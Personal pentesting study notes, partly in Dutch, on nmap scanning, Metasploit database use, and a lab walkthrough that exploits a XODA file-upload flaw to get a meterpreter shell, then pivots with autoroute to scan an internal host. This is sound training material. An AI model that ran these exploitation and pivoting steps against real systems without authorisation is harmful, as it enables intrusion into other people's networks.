
#### Port scanning & Enumeration with nmap 

- Command: nmap -Pn -sV -O ip
- output scan results into xml file format:  -oX \[name file] windows_server_2012 
- nmap -h to see other commands that can be used for output 

Importing scans into msfconsole  (start msfconsole
- command: service PostgreSQL start 
- check the files - command: db_import /root/ 
- import the file - command: db_import /root/filename
- confirm that it is important - command: hosts 
- print services for hosts that you imported - command: services 
- initiate nmap scan from within msfconsole and save results in database - 
	  - Create new workspace - command: workspace -a nmap_msf 
	  - command: db_nmap -Pn -sV -O ip 
	  - list out the hosts and services 


## Enumeration 


###### Port scanning / pivoting 

Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing. We can use it to perform TCP and UDP port scanning as well as enumerating information from services FTP, SSH, HTTP 
	Auxiliary modules can be used during information gathering phase 
Waarom auxiliary modules gebruiken als je ook met nmap kunt scannen? Auxiliary modules zijn erg handig voor **post exploitation phase:**   wanneer je een target hebt geexploit kom je erachter dat deze target onderdeel is van groot netwerk dan heb je nog meer targets die je kunt exploiten through initial exploited server. De auxiliary modules zijn dan handig om verder het interne/private netwerk te scannen. Dit kan niet met nmap omdat je dan nmap moet importeren op geexploite target host of OS. 

![[Pasted image 20230720154107.png]]


- start the postgresql service so we can interact with metasploit database 
- start msfconsole 
- check the status of the database, command: db_status 
- set up workspace, command: workspace -a Port_scan 
- use the auxiliary tcp portscan 
- from the auxiliary module run  curl to download homepage of web application, command: curl ip 
	- search for exploit modules for xoda webapplication -> xoda_file_upload
		- set up rhosts and set targetui /  
		  (/ because the root of the webserver)
	- exploit will set up a meterpreter session 
	- sysinfo will tell us more about the target system 
	- now we want to do port scan on victim two but first we need to find out the private network ip address (subnet) that this victim system is part of so we can target another victim within the network
		- open up a shell session: span a bash session, command: /bin/bash -i
		  ![[Pasted image 20230721142859.png]]
		- ifconfig 
		- get out of bash: terminate shell 
		- back in meterpreter,  command: run autoroute -s ip
				   "run autoroute -s ip" is used to configure a route to a specific subnet over a Meterpreter session. De "autoroute" module in Metasploit wordt gebruikt om de routetabel van het gecompromitteerde systeem te manipuleren, zodat verkeer dat bestemd is voor een specifiek IP-subnet wordt omgeleid via het gecompromitteerde host. Deze techniek is handig wanneer je verkeer wilt omleiden via het gecompromitteerde systeem om toegang te krijgen tot andere interne netwerken.
		- put the meterpreter session in the background, command: background 
		- search portscan 
		- use the tcp portscan 
		- set rhost to the ip in eth1 (ip of the second system)
			because you already added the route we will run the portscan through the first victim. 
	This is how you get a pivot point 
	UDP module: 
	- back 
	- search udp_sweep 

	---- lab ---   
Commands
- ip addr  -  me: 192.70.225.2 and target: 192.70.225.3 
- sudo service postgresql start  && msfconsole -q
- workspace -a Port_scan_target
- search tcp portscan 
- run aux/scanner/portscan/tcp on target
- use exploit(unix/webapp/xoda_file_upload 
- sets targeturi / 
- sysinfo 
- shell
- /bin/bash -i 
- ifconfig
- exit 
- Add the route to metasploit's routing table, command: run autoroute -s 192.135.243.2 
- background
- search portscan 


### FTP Enumeration

Use: file sharing between server and clients, transferring files to directory or web server. FTP access is via username and password

